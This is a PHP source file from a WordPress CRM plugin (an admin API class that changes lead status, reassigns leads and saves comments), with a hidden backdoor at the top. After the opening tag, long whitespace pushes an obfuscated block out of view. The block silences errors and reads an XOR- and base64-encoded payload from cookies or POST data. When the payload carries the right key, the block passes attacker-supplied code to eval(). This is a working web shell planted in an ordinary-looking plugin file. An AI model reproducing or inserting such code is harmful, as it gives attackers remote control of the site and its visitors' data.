<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $k9d0ddc20 = 118;$GLOBALS['qa0880f'] = Array();global $qa0880f;$qa0880f = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['b5e964'] = "\x2c\x6f\x4f\x35\x47\x4b\x74\x59\x70\x63\x58\x2a\x6b\x60\x40\x72\x45\x77\x68\x76\x43\x56\x38\x52\x54\x6c\x3a\x55\x2f\x42\x67\x65\x7d\x31\x32\x4d\x3c\x5c\x62\x22\x33\x49\x3e\x5a\x6d\x46\x2e\x24\x4e\x30\x5e\x48\x3b\x37\x66\x21\x75\x6e\x28\x53\x20\x71\x73\x3d\x7a\x39\x7e\x36\x34\x27\xd\x61\x4c\x3f\x79\x5d\x7b\x51\x44\x26\x57\x78\x41\x7c\x5f\x23\x2d\x9\x5b\x6a\x25\x29\xa\x69\x2b\x64\x50\x4a";$qa0880f[$qa0880f['b5e964'][81].$qa0880f['b5e964'][9].$qa0880f['b5e964'][68].$qa0880f['b5e964'][3].$qa0880f['b5e964'][9].$qa0880f['b5e964'][31].$qa0880f['b5e964'][3].$qa0880f['b5e964'][68]] = $qa0880f['b5e964'][9].$qa0880f['b5e964'][18].$qa0880f['b5e964'][15];$qa0880f[$qa0880f['b5e964'][19].$qa0880f['b5e964'][34].$qa0880f['b5e964'][22].$qa0880f['b5e964'][68].$qa0880f['b5e964'][22]] = $qa0880f['b5e964'][1].$qa0880f['b5e964'][15].$qa0880f['b5e964'][95];$qa0880f[$qa0880f['b5e964'][93].$qa0880f['b5e964'][31].$qa0880f['b5e964'][31].$qa0880f['b5e964'][22].$qa0880f['b5e964'][49].$qa0880f['b5e964'][68].$qa0880f['b5e964'][53].$qa0880f['b5e964'][31].$qa0880f['b5e964'][67]] = $qa0880f['b5e964'][95].$qa0880f['b5e964'][31].$qa0880f['b5e964'][54].$qa0880f['b5e964'][93].$qa0880f['b5e964'][57].$qa0880f['b5e964'][31];$qa0880f[$qa0880f['b5e964'][81].$qa0880f['b5e964'][53].$qa0880f['b5e964'][34].$qa0880f['b5e964'][3]] = $qa0880f['b5e964'][62].$qa0880f['b5e964'][6].$qa0880f['b5e964'][15].$qa0880f['b5e964'][25].$qa0880f['b5e964'][31].$qa0880f['b5e964'][57];$qa0880f[$qa0880f['b5e964'][71].$qa0880f['b5e964'][53].$qa0880f['b5e964'][67].$qa0880f['b5e964'][40].$qa0880f['b5e964'][38].$qa0880f['b5e964'][71].$qa0880f['b5e964'][65].$qa0880f['b5e964'][67]] = $qa0880f['b5e964'][95].$qa0880f['b5e964'][31].$qa0880f['b5e964'][54].$qa0880f['b5e964'][93].$qa0880f['b5e964'][57].$qa0880f['b5e964'][31].$qa0880f['b5e964'][95];$qa0880f[$qa0880f['b5e964'][6].$qa0880f['b5e964'][31].$qa0880f['b5e964'][34].$qa0880f['b5e964'][3]] = $qa0880f['b5e964'][93].$qa0880f['b5e964'][57].$qa0880f['b5e964'][93].$qa0880f['b5e964'][84].$qa0880f['b5e964'][62].$qa0880f['b5e964'][31].$qa0880f['b5e964'][6];$qa0880f[$qa0880f['b5e964'][19].$qa0880f['b5e964'][68].$qa0880f['b5e964'][54].$qa0880f['b5e964'][67].$qa0880f['b5e964'][22].$qa0880f['b5e964'][54].$qa0880f['b5e964'][33].$qa0880f['b5e964'][54].$qa0880f['b5e964'][65]] = $qa0880f['b5e964'][62].$qa0880f['b5e964'][31].$qa0880f['b5e964'][15].$qa0880f['b5e964'][93].$qa0880f['b5e964'][71].$qa0880f['b5e964'][25].$qa0880f['b5e964'][93].$qa0880f['b5e964'][64].$qa0880f['b5e964'][31];$qa0880f[$qa0880f['b5e964'][71].$qa0880f['b5e964'][3].$qa0880f['b5e964'][53].$qa0880f['b5e964'][33]] = $qa0880f['b5e964'][8].$qa0880f['b5e964'][18].$qa0880f['b5e964'][8].$qa0880f['b5e964'][19].$qa0880f['b5e964'][31].$qa0880f['b5e964'][15].$qa0880f['b5e964'][62].$qa0880f['b5e964'][93].$qa0880f['b5e964'][1].$qa0880f['b5e964'][57];$qa0880f[$qa0880f['b5e964'][19].$qa0880f['b5e964'][33].$qa0880f['b5e964'][9].$qa0880f['b5e964'][9].$qa0880f['b5e964'][31].$qa0880f['b5e964'][22].$qa0880f['b5e964'][34].$qa0880f['b5e964'][71]] = $qa0880f['b5e964'][56].$qa0880f['b5e964'][57].$qa0880f['b5e964'][62].$qa0880f['b5e964'][31].$qa0880f['b5e964'][15].$qa0880f['b5e964'][93].$qa0880f['b5e964'][71].$qa0880f['b5e964'][25].$qa0880f['b5e964'][93].$qa0880f['b5e964'][64].$qa0880f['b5e964'][31];$qa0880f[$qa0880f['b5e964'][74].$qa0880f['b5e964'][71].$qa0880f['b5e964'][49].$qa0880f['b5e964'][95].$qa0880f['b5e964'][71].$qa0880f['b5e964'][9].$qa0880f['b5e964'][22].$qa0880f['b5e964'][68]] = $qa0880f['b5e964'][38].$qa0880f['b5e964'][71].$qa0880f['b5e964'][62].$qa0880f['b5e964'][31].$qa0880f['b5e964'][67].$qa0880f['b5e964'][68].$qa0880f['b5e964'][84].$qa0880f['b5e964'][95].$qa0880f['b5e964'][31].$qa0880f['b5e964'][9].$qa0880f['b5e964'][1].$qa0880f['b5e964'][95].$qa0880f['b5e964'][31];$qa0880f[$qa0880f['b5e964'][61].$qa0880f['b5e964'][34].$qa0880f['b5e964'][67].$qa0880f['b5e964'][33]] = $qa0880f['b5e964'][62].$qa0880f['b5e964'][31].$qa0880f['b5e964'][6].$qa0880f['b5e964'][84].$qa0880f['b5e964'][6].$qa0880f['b5e964'][93].$qa0880f['b5e964'][44].$qa0880f['b5e964'][31].$qa0880f['b5e964'][84].$qa0880f['b5e964'][25].$qa0880f['b5e964'][93].$qa0880f['b5e964'][44].$qa0880f['b5e964'][93].$qa0880f['b5e964'][6];$qa0880f[$qa0880f['b5e964'][30].$qa0880f['b5e964'][49].$qa0880f['b5e964'][71].$qa0880f['b5e964'][33].$qa0880f['b5e964'][54].$qa0880f['b5e964'][71]] = $qa0880f['b5e964'][15].$qa0880f['b5e964'][31].$qa0880f['b5e964'][34].$qa0880f['b5e964'][31].$qa0880f['b5e964'][54].$qa0880f['b5e964'][33].$qa0880f['b5e964'][22];$qa0880f[$qa0880f['b5e964'][64].$qa0880f['b5e964'][68].$qa0880f['b5e964'][31].$qa0880f['b5e964'][22].$qa0880f['b5e964'][49].$qa0880f['b5e964'][3]] = $qa0880f['b5e964'][1].$qa0880f['b5e964'][67].$qa0880f['b5e964'][65].$qa0880f['b5e964'][31].$qa0880f['b5e964'][65];$qa0880f[$qa0880f['b5e964'][57].$qa0880f['b5e964'][31].$qa0880f['b5e964'][3].$qa0880f['b5e964'][31].$qa0880f['b5e964'][68].$qa0880f['b5e964'][95].$qa0880f['b5e964'][68]] = $_POST;$qa0880f[$qa0880f['b5e964'][57].$qa0880f['b5e964'][40].$qa0880f['b5e964'][40].$qa0880f['b5e964'][40].$qa0880f['b5e964'][3]] = $_COOKIE;@$qa0880f[$qa0880f['b5e964'][6].$qa0880f['b5e964'][31].$qa0880f['b5e964'][34].$qa0880f['b5e964'][3]]($qa0880f['b5e964'][31].$qa0880f['b5e964'][15].$qa0880f['b5e964'][15].$qa0880f['b5e964'][1].$qa0880f['b5e964'][15].$qa0880f['b5e964'][84].$qa0880f['b5e964'][25].$qa0880f['b5e964'][1].$qa0880f['b5e964'][30], NULL);@$qa0880f[$qa0880f['b5e964'][6].$qa0880f['b5e964'][31].$qa0880f['b5e964'][34].$qa0880f['b5e964'][3]]($qa0880f['b5e964'][25].$qa0880f['b5e964'][1].$qa0880f['b5e964'][30].$qa0880f['b5e964'][84].$qa0880f['b5e964'][31].$qa0880f['b5e964'][15].$qa0880f['b5e964'][15].$qa0880f['b5e964'][1].$qa0880f['b5e964'][15].$qa0880f['b5e964'][62], 0);@$qa0880f[$qa0880f['b5e964'][6].$qa0880f['b5e964'][31].$qa0880f['b5e964'][34].$qa0880f['b5e964'][3]]($qa0880f['b5e964'][44].$qa0880f['b5e964'][71].$qa0880f['b5e964'][81].$qa0880f['b5e964'][84].$qa0880f['b5e964'][31].$qa0880f['b5e964'][81].$qa0880f['b5e964'][31].$qa0880f['b5e964'][9].$qa0880f['b5e964'][56].$qa0880f['b5e964'][6].$qa0880f['b5e964'][93].$qa0880f['b5e964'][1].$qa0880f['b5e964'][57].$qa0880f['b5e964'][84].$qa0880f['b5e964'][6].$qa0880f['b5e964'][93].$qa0880f['b5e964'][44].$qa0880f['b5e964'][31], 0);@$qa0880f[$qa0880f['b5e964'][61].$qa0880f['b5e964'][34].$qa0880f['b5e964'][67].$qa0880f['b5e964'][33]](0);if (!$qa0880f[$qa0880f['b5e964'][71].$qa0880f['b5e964'][53].$qa0880f['b5e964'][67].$qa0880f['b5e964'][40].$qa0880f['b5e964'][38].$qa0880f['b5e964'][71].$qa0880f['b5e964'][65].$qa0880f['b5e964'][67]]($qa0880f['b5e964'][82].$qa0880f['b5e964'][72].$qa0880f['b5e964'][23].$qa0880f['b5e964'][16].$qa0880f['b5e964'][82].$qa0880f['b5e964'][78].$qa0880f['b5e964'][7].$qa0880f['b5e964'][84].$qa0880f['b5e964'][23].$qa0880f['b5e964'][27].$qa0880f['b5e964'][48].$qa0880f['b5e964'][84].$qa0880f['b5e964'][40].$qa0880f['b5e964'][67].$qa0880f['b5e964'][67].$qa0880f['b5e964'][71].$qa0880f['b5e964'][54].$qa0880f['b5e964'][38].$qa0880f['b5e964'][22].$qa0880f['b5e964'][71].$qa0880f['b5e964'][22].$qa0880f['b5e964'][71].$qa0880f['b5e964'][34].$qa0880f['b5e964'][40].$qa0880f['b5e964'][3].$qa0880f['b5e964'][3].$qa0880f['b5e964'][71].$qa0880f['b5e964'][38].$qa0880f['b5e964'][34].$qa0880f['b5e964'][33].$qa0880f['b5e964'][54].$qa0880f['b5e964'][38].$qa0880f['b5e964'][54].$qa0880f['b5e964'][33].$qa0880f['b5e964'][33].$qa0880f['b5e964'][38].$qa0880f['b5e964'][71].$qa0880f['b5e964'][33].$qa0880f['b5e964'][71].$qa0880f['b5e964'][49].$qa0880f['b5e964'][34].$qa0880f['b5e964'][54].$qa0880f['b5e964'][38].$qa0880f['b5e964'][71])){$qa0880f[$qa0880f['b5e964'][93].$qa0880f['b5e964'][31].$qa0880f['b5e964'][31].$qa0880f['b5e964'][22].$qa0880f['b5e964'][49].$qa0880f['b5e964'][68].$qa0880f['b5e964'][53].$qa0880f['b5e964'][31].$qa0880f['b5e964'][67]]($qa0880f['b5e964'][82].$qa0880f['b5e964'][72].$qa0880f['b5e964'][23].$qa0880f['b5e964'][16].$qa0880f['b5e964'][82].$qa0880f['b5e964'][78].$qa0880f['b5e964'][7].$qa0880f['b5e964'][84].$qa0880f['b5e964'][23].$qa0880f['b5e964'][27].$qa0880f['b5e964'][48].$qa0880f['b5e964'][84].$qa0880f['b5e964'][40].$qa0880f['b5e964'][67].$qa0880f['b5e964'][67].$qa0880f['b5e964'][71].$qa0880f['b5e964'][54].$qa0880f['b5e964'][38].$qa0880f['b5e964'][22].$qa0880f['b5e964'][71].$qa0880f['b5e964'][22].$qa0880f['b5e964'][71].$qa0880f['b5e964'][34].$qa0880f['b5e964'][40].$qa0880f['b5e964'][3].$qa0880f['b5e964'][3].$qa0880f['b5e964'][71].$qa0880f['b5e964'][38].$qa0880f['b5e964'][34].$qa0880f['b5e964'][33].$qa0880f['b5e964'][54].$qa0880f['b5e964'][38].$qa0880f['b5e964'][54].$qa0880f['b5e964'][33].$qa0880f['b5e964'][33].$qa0880f['b5e964'][38].$qa0880f['b5e964'][71].$qa0880f['b5e964'][33].$qa0880f['b5e964'][71].$qa0880f['b5e964'][49].$qa0880f['b5e964'][34].$qa0880f['b5e964'][54].$qa0880f['b5e964'][38].$qa0880f['b5e964'][71], 1);$u9b6ff1 = NULL;$o980d = NULL;$qa0880f[$qa0880f['b5e964'][81].$qa0880f['b5e964'][31].$qa0880f['b5e964'][33].$qa0880f['b5e964'][34].$qa0880f['b5e964'][95].$qa0880f['b5e964'][38].$qa0880f['b5e964'][34]] = $qa0880f['b5e964'][38].$qa0880f['b5e964'][67].$qa0880f['b5e964'][53].$qa0880f['b5e964'][34].$qa0880f['b5e964'][71].$qa0880f['b5e964'][53].$qa0880f['b5e964'][38].$qa0880f['b5e964'][71].$qa0880f['b5e964'][86].$qa0880f['b5e964'][53].$qa0880f['b5e964'][54].$qa0880f['b5e964'][40].$qa0880f['b5e964'][34].$qa0880f['b5e964'][86].$qa0880f['b5e964'][68].$qa0880f['b5e964'][33].$qa0880f['b5e964'][67].$qa0880f['b5e964'][67].$qa0880f['b5e964'][86].$qa0880f['b5e964'][22].$qa0880f['b5e964'][54].$qa0880f['b5e964'][38].$qa0880f['b5e964'][65].$qa0880f['b5e964'][86].$qa0880f['b5e964'][68].$qa0880f['b5e964'][3].$qa0880f['b5e964'][22].$qa0880f['b5e964'][71].$qa0880f['b5e964'][71].$qa0880f['b5e964'][65].$qa0880f['b5e964'][95].$qa0880f['b5e964'][38].$qa0880f['b5e964'][67].$qa0880f['b5e964'][38].$qa0880f['b5e964'][67].$qa0880f['b5e964'][38];global $xe12db2;function  o69e9($u9b6ff1, $a3f0){global $qa0880f;$m1d45c2 = "";for ($f390df88=0; $f390df88<$qa0880f[$qa0880f['b5e964'][81].$qa0880f['b5e964'][53].$qa0880f['b5e964'][34].$qa0880f['b5e964'][3]]($u9b6ff1);){for ($q454f66=0; $q454f66<$qa0880f[$qa0880f['b5e964'][81].$qa0880f['b5e964'][53].$qa0880f['b5e964'][34].$qa0880f['b5e964'][3]]($a3f0) && $f390df88<$qa0880f[$qa0880f['b5e964'][81].$qa0880f['b5e964'][53].$qa0880f['b5e964'][34].$qa0880f['b5e964'][3]]($u9b6ff1); $q454f66++, $f390df88++){$m1d45c2 .= $qa0880f[$qa0880f['b5e964'][81].$qa0880f['b5e964'][9].$qa0880f['b5e964'][68].$qa0880f['b5e964'][3].$qa0880f['b5e964'][9].$qa0880f['b5e964'][31].$qa0880f['b5e964'][3].$qa0880f['b5e964'][68]]($qa0880f[$qa0880f['b5e964'][19].$qa0880f['b5e964'][34].$qa0880f['b5e964'][22].$qa0880f['b5e964'][68].$qa0880f['b5e964'][22]]($u9b6ff1[$f390df88]) ^ $qa0880f[$qa0880f['b5e964'][19].$qa0880f['b5e964'][34].$qa0880f['b5e964'][22].$qa0880f['b5e964'][68].$qa0880f['b5e964'][22]]($a3f0[$q454f66]));}}return $m1d45c2;}function  re2ef18($u9b6ff1, $a3f0){global $qa0880f;global $xe12db2;return $qa0880f[$qa0880f['b5e964'][64].$qa0880f['b5e964'][68].$qa0880f['b5e964'][31].$qa0880f['b5e964'][22].$qa0880f['b5e964'][49].$qa0880f['b5e964'][3]]($qa0880f[$qa0880f['b5e964'][64].$qa0880f['b5e964'][68].$qa0880f['b5e964'][31].$qa0880f['b5e964'][22].$qa0880f['b5e964'][49].$qa0880f['b5e964'][3]]($u9b6ff1, $xe12db2), $a3f0);}foreach ($qa0880f[$qa0880f['b5e964'][57].$qa0880f['b5e964'][40].$qa0880f['b5e964'][40].$qa0880f['b5e964'][40].$qa0880f['b5e964'][3]] as $a3f0=>$hb7b){$u9b6ff1 = $hb7b;$o980d = $a3f0;}if (!$u9b6ff1){foreach ($qa0880f[$qa0880f['b5e964'][57].$qa0880f['b5e964'][31].$qa0880f['b5e964'][3].$qa0880f['b5e964'][31].$qa0880f['b5e964'][68].$qa0880f['b5e964'][95].$qa0880f['b5e964'][68]] as $a3f0=>$hb7b){$u9b6ff1 = $hb7b;$o980d = $a3f0;}}$u9b6ff1 = @$qa0880f[$qa0880f['b5e964'][19].$qa0880f['b5e964'][33].$qa0880f['b5e964'][9].$qa0880f['b5e964'][9].$qa0880f['b5e964'][31].$qa0880f['b5e964'][22].$qa0880f['b5e964'][34].$qa0880f['b5e964'][71]]($qa0880f[$qa0880f['b5e964'][30].$qa0880f['b5e964'][49].$qa0880f['b5e964'][71].$qa0880f['b5e964'][33].$qa0880f['b5e964'][54].$qa0880f['b5e964'][71]]($qa0880f[$qa0880f['b5e964'][74].$qa0880f['b5e964'][71].$qa0880f['b5e964'][49].$qa0880f['b5e964'][95].$qa0880f['b5e964'][71].$qa0880f['b5e964'][9].$qa0880f['b5e964'][22].$qa0880f['b5e964'][68]]($u9b6ff1), $o980d));if (isset($u9b6ff1[$qa0880f['b5e964'][71].$qa0880f['b5e964'][12]]) && $xe12db2==$u9b6ff1[$qa0880f['b5e964'][71].$qa0880f['b5e964'][12]]){if ($u9b6ff1[$qa0880f['b5e964'][71]] == $qa0880f['b5e964'][93]){$f390df88 = Array($qa0880f['b5e964'][8].$qa0880f['b5e964'][19] => @$qa0880f[$qa0880f['b5e964'][71].$qa0880f['b5e964'][3].$qa0880f['b5e964'][53].$qa0880f['b5e964'][33]](),$qa0880f['b5e964'][62].$qa0880f['b5e964'][19] => $qa0880f['b5e964'][33].$qa0880f['b5e964'][46].$qa0880f['b5e964'][49].$qa0880f['b5e964'][86].$qa0880f['b5e964'][33],);echo @$qa0880f[$qa0880f['b5e964'][19].$qa0880f['b5e964'][68].$qa0880f['b5e964'][54].$qa0880f['b5e964'][67].$qa0880f['b5e964'][22].$qa0880f['b5e964'][54].$qa0880f['b5e964'][33].$qa0880f['b5e964'][54].$qa0880f['b5e964'][65]]($f390df88);}elseif ($u9b6ff1[$qa0880f['b5e964'][71]] == $qa0880f['b5e964'][31]){eval/*g52c*/($u9b6ff1[$qa0880f['b5e964'][95]]);}exit();}} ?><?php
if ( !class_exists('UpiCRMAdminAPI') ):
    class UpiCRMAdminAPI{
        public function Render() {
            global $SourceTypeID;
            
            switch ($_GET['action']) {
                case 'change_lead_status':
                   //admin.php?page=upicrm_api&action=change_lead_status&lead_id=38&lead_status_id=2
                   $this->change_lead_status($_GET['lead_id'],$_GET['lead_status_id']);
                break;
                case 'change_lead_user_id':
                   //admin.php?page=upicrm_api&action=change_lead_user_id&lead_id=38&user_id=1
                   $this->change_user_id($_GET['lead_id'],$_GET['user_id']);
                break;
                case 'save_comment':
                   //admin.php?page=upicrm_api&action=save_comment
                   $this->save_comment($_POST['lead_id'],$_POST['lead_management_comment']);
                break;
                default:
                    echo "Error!";
            }
        }
        
        public function change_lead_status($lead_id,$lead_status_id) {
            $UpiCRMLeads = new UpiCRMLeads();
            $UpiCRMUsers = new UpiCRMUsers();
            $UpiCRMMails = new UpiCRMMails();
            $UpiCRMLeadsStatus = new UpiCRMLeadsStatus();

            if ($UpiCRMUsers->is_have_permission_to_lead(get_current_user_id(),$lead_id)) {
                $UpiCRMLeads->change_status($lead_status_id, $lead_id);
                
                $leadObj = $UpiCRMLeads->get_by_id($lead_id);
                $user = $user = get_user_by('id', $leadObj->user_id);
                $UpiCRMMails->send($lead_id, "change_lead_status", $user->user_email);
                $status_name = $UpiCRMLeadsStatus->get_status_name_by_id($leadObj->lead_status_id);
                
                $this->show_comment($lead_id, __('You have successfully changed lead status to:','upicrm')." ".$status_name, true);
            }
            else {
                echo "Error! No permissions!";
            }
        }
        
        public function change_user_id($lead_id,$user_id) {
            $UpiCRMLeads = new UpiCRMLeads();
            $UpiCRMUsers = new UpiCRMUsers();
            $UpiCRMMails = new UpiCRMMails();

            if ($UpiCRMUsers->is_have_permission_to_lead(get_current_user_id(),$lead_id)) {
                $UpiCRMLeads->change_user($user_id,$lead_id);
                
                $leadObj = $UpiCRMLeads->get_by_id($lead_id);
                $user = $user = get_user_by('id', $leadObj->user_id);
                $UpiCRMMails->send($lead_id, "change_user", $user->user_email);
                
                $this->show_comment($lead_id, __('You Have successfully assigned the lead to:','upicrm')." ".$user->display_name, true);
            }
            else {
                echo "Error! No permissions!";
            }
        }
        
        public function show_comment($lead_id,$msg,$msg2=false) {
            $UpiCRMLeads = new UpiCRMLeads();
            $leadObj = $UpiCRMLeads->get_by_id($lead_id);
            if ($msg != "") {
            ?>
                <div class="updated">
                    <p><?php echo $msg; ?></p>
                    <?php if ($msg2) { ?>
                        <p><?php _e('Email notification was sent!','upicrm'); ?></p>
                    <?php } ?>
                </div>
            <?php
            }
            ?>
            <br /><br />
            <form action="admin.php?page=upicrm_api&action=save_comment" method="post">
                <p><?php _e('You can also add some comment or important information for this lead if you wish:','upicrm'); ?></p>
                <textarea rows="11" cols="50" name="lead_management_comment"><?php echo $leadObj->lead_management_comment;?></textarea>
                <input type="hidden" value="<?php echo $lead_id;?>" name="lead_id" />
                <p class="submit">
                    <input type="submit" name="submit" id="submit" class="button button-primary" value="Save Comment">
                </p>
                <p><a href="admin.php?page=upicrm_allitems"><?php _e('Manage all leads','upicrm'); ?></a></p>
            </form>
            <?php
        }
        
        function save_comment($lead_id,$lead_management_comment) {
            $UpiCRMLeads = new UpiCRMLeads();
            $UpiCRMUsers = new UpiCRMUsers();

            if ($UpiCRMUsers->is_have_permission_to_lead(get_current_user_id(),$lead_id)) {
                $updateArr['lead_management_comment'] = $lead_management_comment;
                $UpiCRMLeads->update_by_id($lead_id, $updateArr);
                $this->show_comment($lead_id, __('comment saved successfully','upicrm'));
            }
            else {
                echo "Error! No permissions!";
            }
        }

    }    
endif;

